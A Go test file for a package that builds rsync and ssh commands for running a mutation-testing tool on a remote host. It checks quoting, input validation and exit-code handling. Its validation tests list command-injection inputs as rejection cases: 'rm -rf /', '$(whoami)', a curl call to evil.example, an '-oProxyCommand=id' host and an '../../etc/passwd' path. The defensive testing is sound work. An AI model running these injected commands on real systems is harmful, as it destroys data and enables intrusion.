package remote

import (
	"errors"
	"fmt"
	"os/exec"
	"reflect"
	"runtime"
	"strings"
	"testing"
)

const host = "helicon"

func target() Target { return Target{Host: host, Workdir: "/srv/x"} }

// contains reports whether argv carries want as one whole element. Substring
// matching over a joined argv would pass on a value that is split across two
// elements, which is exactly the bug an argv test exists to catch.
func contains(argv []string, want string) bool {
	for _, a := range argv {
		if a == want {
			return true
		}
	}
	return false
}

// --- SyncArgs ---------------------------------------------------------------

func TestSyncArgsCarriesTheLockedFlags(t *testing.T) {
	argv, err := SyncArgs(target(), "/local/repo")
	if err != nil {
		t.Fatalf("SyncArgs = %v", err)
	}
	if argv[0] != "rsync" {
		t.Fatalf("argv[0] = %q, want rsync", argv[0])
	}
	// Each of these is a locked decision, not a stylistic choice: dropping
	// --delete leaves deleted files on the remote, and dropping the .gitignore
	// filter puts node_modules and build output on the wire.
	for _, want := range []string{"--delete", "--filter=:- .gitignore"} {
		if !contains(argv, want) {
			t.Errorf("argv is missing %q: %v", want, argv)
		}
	}
	// .git must NOT be excluded. Without it the remote tree is not a git
	// repository, and every test that shells out to git fails there while
	// passing locally — which fails the package's coverage pass and leaves it
	// unmeasured with nothing saying so. Proven against a real host: six tests
	// in internal/cmd, and the package holding most of this phase's code
	// silently absent from a run that reported 0.95.
	for _, forbidden := range []string{"--exclude=.git", "--exclude=.git/"} {
		if contains(argv, forbidden) {
			t.Errorf("argv carries %q — the remote tree would not be a git repo: %v", forbidden, argv)
		}
	}
	// The filter rule is ONE argv element with no shell quotes. There is no
	// shell between here and rsync, so quotes would become part of the rule and
	// rsync would look for a file literally named "'- .gitignore'".
	for _, a := range argv {
		if strings.Contains(a, "'") {
			t.Errorf("argv element %q carries a shell quote; rsync is spawned without a shell", a)
		}
	}
	src, dst := argv[len(argv)-2], argv[len(argv)-1]
	if src != "/local/repo/" {
		t.Errorf("source = %q, want %q — without the trailing slash rsync nests the tree one directory deeper", src, "/local/repo/")
	}
	if dst != "helicon:/srv/x" {
		t.Errorf("dest = %q, want %q", dst, "helicon:/srv/x")
	}
}

func TestSyncArgsRefusesARelativeRoot(t *testing.T) {
	// A relative root resolves against the caller's cwd, which for a mutation
	// run is not knowably the repo root.
	if _, err := SyncArgs(target(), "repo"); err == nil {
		t.Fatal("a relative local root was accepted")
	}
}

// --- SSHArgs ----------------------------------------------------------------

func TestSSHArgsNeverSpawnsTheAdapterLocally(t *testing.T) {
	argv, err := SSHArgs(target())
	if err != nil {
		t.Fatalf("SSHArgs = %v", err)
	}
	// EXACTLY this, for every remote command in a run. The workdir, the adapter
	// argv and every environment value live in the piped script — see Script.
	// The ssh command string is the remote shell's argv and shows up in that
	// host's process list, so nothing derived is allowed here.
	want := []string{"ssh", host, "bash", "-s"}
	if !reflect.DeepEqual(argv, want) {
		t.Fatalf("argv = %v, want %v", argv, want)
	}

	script, err := Script(target(), []string{"gremlins", "unleash", "./internal/cmd"})
	if err != nil {
		t.Fatalf("Script = %v", err)
	}
	for _, w := range []string{"cd ", "/srv/x", "&&", "gremlins", "unleash", "./internal/cmd"} {
		if !strings.Contains(script, w) {
			t.Errorf("remote script %q is missing %q", script, w)
		}
	}
	if strings.Index(script, "cd ") > strings.Index(script, "gremlins") {
		t.Errorf("remote script runs the adapter before cd-ing into the workdir: %q", script)
	}
	for _, a := range argv {
		if strings.Contains(a, "gremlins") {
			t.Errorf("the adapter binary reached argv %v — it must live in the piped script", argv)
		}
	}
}

func TestScriptQuotesEveryRemoteWord(t *testing.T) {
	// The script is read by a remote shell. A package path carrying a space or
	// a metacharacter that reached the shell unquoted would be split, or worse,
	// executed.
	script, err := Script(target(), []string{"gremlins", "unleash", "./a b;c"})
	if err != nil {
		t.Fatalf("Script = %v", err)
	}
	if !strings.Contains(script, `'./a b;c'`) {
		t.Errorf("remote script does not quote the derived word: %q", script)
	}
}

func TestScriptRejectsAnEmptyCommand(t *testing.T) {
	if _, err := Script(target(), nil); err == nil {
		t.Fatal("an empty remote command was accepted")
	}
}

// --- Target validation ------------------------------------------------------

// TestValidateRefusesShellMetacharacters is the guarantee argfence cannot give.
// argfence's Reject rule stops a value that would be read as an OPTION; the
// workdir is interpolated into a remote SHELL command, where `;` and `$(` are
// the vector and no leading dash is involved.
func TestValidateRefusesShellMetacharacters(t *testing.T) {
	for _, workdir := range []string{
		"/srv/x; rm -rf /",
		"/srv/$(whoami)",
		"/srv/`id`",
		"/srv/x\nrm -rf /",
		"/srv/x && curl evil.example",
		"/srv/x|tee /tmp/y",
		"srv/x",       // not absolute
		"/srv/../etc", // not canonical
	} {
		t.Run(workdir, func(t *testing.T) {
			tg := Target{Host: host, Workdir: workdir}
			err := tg.Validate()
			if err == nil {
				t.Fatalf("workdir %q was accepted", workdir)
			}
			if !errors.Is(err, ErrUnsafeTarget) {
				t.Errorf("refusal does not wrap ErrUnsafeTarget: %v", err)
			}
			// %q, not the raw string: the refusal quotes the value so a
			// newline or a trailing space is visible in the message rather
			// than reflowing it.
			if !strings.Contains(err.Error(), fmt.Sprintf("%q", workdir)) {
				t.Errorf("refusal does not name the workdir: %v", err)
			}
			// And no argv is built — a caller that dropped the error must not
			// be handed something runnable.
			if argv, err := SSHArgs(tg); err == nil || argv != nil {
				t.Errorf("SSHArgs built %v for an unsafe workdir", argv)
			}
			if script, err := Script(tg, []string{"gremlins"}); err == nil || script != "" {
				t.Errorf("Script built %q for an unsafe workdir", script)
			}
			if argv, err := SyncArgs(tg, "/local/repo"); err == nil || argv != nil {
				t.Errorf("SyncArgs built %v for an unsafe workdir", argv)
			}
		})
	}
}

func TestValidateRefusesAnOptionShapedHost(t *testing.T) {
	for _, h := range []string{"-oProxyCommand=id", "-helicon", "", "helicon:/srv", "he licon", "host$(id)"} {
		t.Run(h, func(t *testing.T) {
			tg := Target{Host: h, Workdir: "/srv/x"}
			if err := tg.Validate(); err == nil {
				t.Fatalf("host %q was accepted", h)
			}
			if argv, err := SSHArgs(tg); err == nil || argv != nil {
				t.Errorf("SSHArgs built %v for host %q", argv, h)
			}
		})
	}
}

func TestValidateAcceptsRealTargets(t *testing.T) {
	for _, tg := range []Target{
		{Host: "helicon", Workdir: "/srv/dross"},
		{Host: "build@helicon", Workdir: "/home/build/dross-work"},
		{Host: "helicon.lan", Workdir: "/srv"},
		{Host: "build-01.rivil.dev", Workdir: "/var/tmp/dross.run"},
	} {
		if err := tg.Validate(); err != nil {
			t.Errorf("Validate(%+v) = %v, want nil — over-rejection pushes users off the safe path", tg, err)
		}
	}
}

// TestInStaysUnderTheWorkdir covers the monorepo knob: cmd.Dir on the local ssh
// process is meaningless, so the sub-directory has to reach the remote cd.
func TestInStaysUnderTheWorkdir(t *testing.T) {
	sub, err := target().In("web")
	if err != nil {
		t.Fatalf("In(web) = %v", err)
	}
	if sub.Workdir != "/srv/x/web" {
		t.Errorf("In(web).Workdir = %q, want /srv/x/web", sub.Workdir)
	}
	if sub.Host != host {
		t.Errorf("In dropped the host: %+v", sub)
	}
	for _, escape := range []string{"../..", "../sibling", "/etc"} {
		if got, err := target().In(escape); err == nil {
			t.Errorf("In(%q) = %+v, want a refusal", escape, got)
		}
	}
}

// --- FetchArgs --------------------------------------------------------------

func TestFetchArgsPullsFromTheWorkdir(t *testing.T) {
	argv, err := FetchArgs(target(), "reports/gremlins/output.json", "/local/repo/reports/gremlins/output.json")
	if err != nil {
		t.Fatalf("FetchArgs = %v", err)
	}
	if argv[0] != "rsync" {
		t.Fatalf("argv[0] = %q, want rsync", argv[0])
	}
	if argv[len(argv)-2] != "helicon:/srv/x/reports/gremlins/output.json" {
		t.Errorf("source = %q", argv[len(argv)-2])
	}
	if argv[len(argv)-1] != "/local/repo/reports/gremlins/output.json" {
		t.Errorf("dest = %q", argv[len(argv)-1])
	}
	if _, err := FetchArgs(target(), "../../etc/passwd", "/tmp/x"); err == nil {
		t.Error("a fetch reaching outside the workdir was accepted")
	}
	if _, err := FetchArgs(target(), "reports/x.json", "relative/x.json"); err == nil {
		t.Error("a relative local destination was accepted")
	}
}

// --- Classify ---------------------------------------------------------------

// TestClassifyReadsTheCodeNotTheProse: stderr text varies by ssh version,
// locale and remote shell. The exit code does not, which is why the whole
// failure taxonomy hangs off it.
func TestClassifyReadsTheCodeNotTheProse(t *testing.T) {
	for _, tc := range []struct {
		bin  string
		code int
		want error
	}{
		{"ssh", 255, ErrTransport},
		{"rsync", 255, ErrTransport},
		{"rsync", 23, ErrPartial},
		{"rsync", 24, ErrPartial},
		{"rsync", 12, ErrTransport},
		{"ssh", 1, ErrRemoteCommand},
		{"ssh", 127, ErrRemoteCommand},
		{"ssh", 126, ErrRemoteCommand},
		{"rsync", 1, ErrRemoteCommand},
	} {
		t.Run(fmt.Sprintf("%s-%d", tc.bin, tc.code), func(t *testing.T) {
			err := Classify(tc.bin, host, tc.code)
			if err == nil {
				t.Fatalf("Classify(%s, %d) = nil", tc.bin, tc.code)
			}
			if !errors.Is(err, tc.want) {
				t.Errorf("Classify(%s, %d) = %v, want %v", tc.bin, tc.code, err, tc.want)
			}
			var ee *ExitError
			if !errors.As(err, &ee) {
				t.Fatalf("Classify did not return an *ExitError: %v", err)
			}
			if ee.Code != tc.code {
				t.Errorf("carried code = %d, want %d", ee.Code, tc.code)
			}
			if !strings.Contains(err.Error(), host) || !strings.Contains(err.Error(), tc.bin) {
				t.Errorf("error names neither host nor binary: %v", err)
			}
		})
	}
	if err := Classify("ssh", host, 0); err != nil {
		t.Errorf("Classify(ssh, 0) = %v, want nil", err)
	}
}

// TestClassifyKeepsTransportApartFromTheProgram is the distinction the whole
// phase turns on: exit 1 is a mutation tool reporting survivors and is
// tolerated; exit 255 is a leg that never ran and must never look like a clean
// result.
func TestClassifyKeepsTransportApartFromTheProgram(t *testing.T) {
	survivors := Classify("ssh", host, 1)
	unreachable := Classify("ssh", host, 255)
	if errors.Is(survivors, ErrTransport) {
		t.Error("a remote program exiting 1 was classified as a transport failure")
	}
	if errors.Is(unreachable, ErrRemoteCommand) {
		t.Error("an unreachable host was classified as a remote command failure")
	}
}

// --- exec seam + Probe ------------------------------------------------------

// fakeExec substitutes the exec seam with a shell that replays a canned stdout
// and exit code, recording every argv it was handed.
func fakeExec(t *testing.T, reply func(argv []string) (string, int)) *[][]string {
	t.Helper()
	var recorded [][]string
	prev := commandFn
	commandFn = func(argv []string, stdin string) *exec.Cmd {
		// The piped script is recorded as a trailing element: for an ssh
		// command the argv is now the same four elements every time, so the
		// script is the only thing that says which command this is.
		cp := append(append([]string(nil), argv...), stdin)
		recorded = append(recorded, cp)
		out, code := reply(cp)
		script := fmt.Sprintf("printf %%s %s; exit %d", shellQuote(out), code)
		return exec.Command("/bin/sh", "-c", script)
	}
	t.Cleanup(func() { commandFn = prev })
	return &recorded
}

// TestProbeReadsTheRemoteCoreCount is the remote_workers decision in one
// assertion: the number that sizes the run comes from the HOST, never from
// runtime.NumCPU() here. A probe that quietly fell back to the local count
// would size a 32-core host's run by a laptop.
func TestProbeReadsTheRemoteCoreCount(t *testing.T) {
	remoteCores := runtime.NumCPU()*2 + 7 // impossible to reach by accident
	calls := fakeExec(t, func(argv []string) (string, int) {
		return fmt.Sprintf("%d\n", remoteCores), 0
	})
	r, err := Probe(target(), nil)
	if err != nil {
		t.Fatalf("Probe = %v", err)
	}
	if r.Cores != remoteCores {
		t.Errorf("Cores = %d, want %d", r.Cores, remoteCores)
	}
	if r.Cores == runtime.NumCPU() {
		t.Errorf("Probe returned the LOCAL core count %d", runtime.NumCPU())
	}
	if len(*calls) != 1 {
		t.Fatalf("Probe made %d calls, want 1", len(*calls))
	}
	if (*calls)[0][0] != "ssh" {
		t.Errorf("Probe spawned %q, want ssh", (*calls)[0][0])
	}
}

func TestProbeRejectsUnusableCoreCounts(t *testing.T) {
	for _, out := range []string{"", "  ", "many", "0", "-4", "8 cores"} {
		t.Run(out, func(t *testing.T) {
			fakeExec(t, func([]string) (string, int) { return out, 0 })
			r, err := Probe(target(), nil)
			if err == nil {
				t.Fatalf("Probe accepted %q as %d cores", out, r.Cores)
			}
			if r.Cores != 0 {
				t.Errorf("Probe returned %d cores alongside an error", r.Cores)
			}
		})
	}
}

func TestProbeRecordsMissingToolsButAbortsOnTransport(t *testing.T) {
	calls := fakeExec(t, func(argv []string) (string, int) {
		cmd := argv[len(argv)-1]
		switch {
		case strings.Contains(cmd, "getconf"):
			return "32\n", 0
		case strings.Contains(cmd, "gremlins"):
			return "", 1 // command -v: not found
		default:
			return "/usr/bin/go\n", 0
		}
	})
	r, err := Probe(target(), []string{"go", "gremlins"})
	if err != nil {
		t.Fatalf("Probe = %v", err)
	}
	if len(r.Missing) != 1 || r.Missing[0] != "gremlins" {
		t.Errorf("Missing = %v, want [gremlins]", r.Missing)
	}
	if len(*calls) != 3 {
		t.Errorf("Probe made %d calls, want 3 (cores + one per tool)", len(*calls))
	}

	// An unreachable host must not read as "every tool is missing" — that would
	// send the user installing software on a box they cannot reach.
	fakeExec(t, func([]string) (string, int) { return "", 255 })
	if _, err := Probe(target(), []string{"go"}); !errors.Is(err, ErrTransport) {
		t.Errorf("Probe on an unreachable host = %v, want ErrTransport", err)
	}
}

func TestExecRefusesAnUnsafeTargetBeforeSpawning(t *testing.T) {
	calls := fakeExec(t, func([]string) (string, int) { return "", 0 })
	if _, err := Exec(Target{Host: "-oProxyCommand=id", Workdir: "/srv/x"}, []string{"go", "version"}); err == nil {
		t.Fatal("Exec accepted an option-shaped host")
	}
	if len(*calls) != 0 {
		t.Errorf("Exec spawned %v for a refused target", *calls)
	}
}

// --- ScriptAll ---------------------------------------------------------------

// TestScriptAllChainsWithAndNotSemicolon.
//
// The chaining operator is load-bearing. ScriptAll's caller pairs a stale-report
// `rm` with the `mkdir` that recreates its directory; under `;` the mkdir would
// run even when the rm failed, leaving a directory the run cannot trust with a
// previous run's report still in it. Under `&&` the failure stops the chain and
// its exit code is what reaches ssh.
func TestScriptAllChainsWithAndNotSemicolon(t *testing.T) {
	script, err := ScriptAll(target(), [][]string{
		{"rm", "-rf", "reports/gremlins/x.json"},
		{"mkdir", "-p", "reports/gremlins"},
	})
	if err != nil {
		t.Fatalf("ScriptAll = %v", err)
	}
	want := "cd '/srv/x' && 'rm' '-rf' 'reports/gremlins/x.json' && exec 'mkdir' '-p' 'reports/gremlins'\n"
	if script != want {
		t.Errorf("script =\n%q\nwant\n%q", script, want)
	}
	if strings.Contains(script, ";") {
		t.Errorf("commands are separated by `;` — a failed rm would not stop the mkdir: %q", script)
	}
}

// TestScriptAllQuotesEveryWordOfEveryCommand: the quoting guarantee must not
// weaken for the second and later commands in a chain.
func TestScriptAllQuotesEveryWordOfEveryCommand(t *testing.T) {
	script, err := ScriptAll(target(), [][]string{
		{"rm", "-rf", "a b;c"},
		{"mkdir", "-p", "$(id)"},
	})
	if err != nil {
		t.Fatalf("ScriptAll = %v", err)
	}
	for _, want := range []string{`'a b;c'`, `'$(id)'`} {
		if !strings.Contains(script, want) {
			t.Errorf("script does not quote %s: %q", want, script)
		}
	}
}

// TestScriptAllRejectsAnEmptyCommandAnywhereInTheChain. An empty argv would
// emit a bare `&&` and produce a syntax error on the remote — at which point
// the exit code says nothing about what the run was trying to do.
func TestScriptAllRejectsAnEmptyCommandAnywhereInTheChain(t *testing.T) {
	if _, err := ScriptAll(target(), nil); err == nil {
		t.Error("an empty command list was accepted")
	}
	if _, err := ScriptAll(target(), [][]string{{"rm", "-rf", "x"}, {}}); err == nil {
		t.Error("an empty command in the tail of the chain was accepted")
	}
}

// TestScriptStillDelegatesToScriptAll: the single-command form keeps its exact
// output, so every existing caller and its pinned argv are unaffected.
func TestScriptStillDelegatesToScriptAll(t *testing.T) {
	one, err := Script(target(), []string{"gremlins", "unleash"})
	if err != nil {
		t.Fatal(err)
	}
	all, err := ScriptAll(target(), [][]string{{"gremlins", "unleash"}})
	if err != nil {
		t.Fatal(err)
	}
	if one != all {
		t.Errorf("Script and ScriptAll disagree:\n%q\n%q", one, all)
	}
	if one != "cd '/srv/x' && exec 'gremlins' 'unleash'\n" {
		t.Errorf("the single-command script shape changed: %q", one)
	}
}

// TestScriptExecsTheToolInsteadOfForkingIt.
//
// Measured on helicon 2026-08-16: gremlins forked by the `bash -s` shell this
// script is piped to dies at startup — `Failed to find executable : Is a
// directory`, exit 1, no report written — while the identical invocation runs
// clean when the shell exec's it. `dross verify` read that as an unmeasured
// package and the whole mutation leg went dark, which is a silent-partial of
// exactly the kind the verify verdict is supposed to refuse.
//
// So the `exec` is a correctness property of the remote runner, not formatting:
// pinned here, on both the single-command and the chained form, and pinned as
// exec'ing the LAST command only — an `exec` on an earlier one would replace the
// shell and the rest of the chain would never run at all.
func TestScriptExecsTheToolInsteadOfForkingIt(t *testing.T) {
	one, err := Script(target(), []string{"gremlins", "unleash"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(one, "exec 'gremlins'") {
		t.Errorf("the tool is forked rather than exec'd: %q", one)
	}

	chain, err := ScriptAll(target(), [][]string{
		{"rm", "-rf", "reports/gremlins/x.json"},
		{"mkdir", "-p", "reports/gremlins"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(chain, "&& exec 'mkdir'") {
		t.Errorf("the last command of a chain is forked rather than exec'd: %q", chain)
	}
	if strings.Contains(chain, "exec 'rm'") {
		t.Errorf("an earlier command is exec'd — the rest of the chain would never run: %q", chain)
	}
	if strings.Count(chain, "exec ") != 1 {
		t.Errorf("want exactly one exec in the chain, got %q", chain)
	}
}
